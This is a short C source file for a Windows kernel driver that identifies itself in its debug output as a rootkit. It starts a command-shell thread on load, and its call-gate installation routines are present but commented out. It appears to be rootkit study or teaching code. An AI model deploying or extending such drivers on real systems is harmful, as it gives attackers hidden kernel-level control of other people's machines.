///////////////////////////////////////////////////////////////////////
// Callgate device driver
// Just print out the entries in the GDT
///////////////////////////////////////////////////////////////////////
#include "ntddk.h"
#include "common.h"
#include "shell.h"
#include "gdt.h"

VOID Unload( IN PDRIVER_OBJECT DriverObject )
{
	DbgPrint("OnUnload called\n");
	KillCommandThread();
}

NTSTATUS StubbedDispatch(
				  IN PDEVICE_OBJECT theDeviceObject,
				  IN PIRP theIrp )
{
	theIrp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest( theIrp, IO_NO_INCREMENT );

	return theIrp->IoStatus.Status;
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
{
	int i;
	int k;

	DbgPrint("Rootkit: The callgate driver loaded.\n");
	theDriverObject->DriverUnload  = Unload; 

	for(i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		theDriverObject->MajorFunction[i] = StubbedDispatch;
	}

	StartCommandThread();
	//k = InstallCallgate();
	//TestCallgate(k);

	return STATUS_SUCCESS;
}

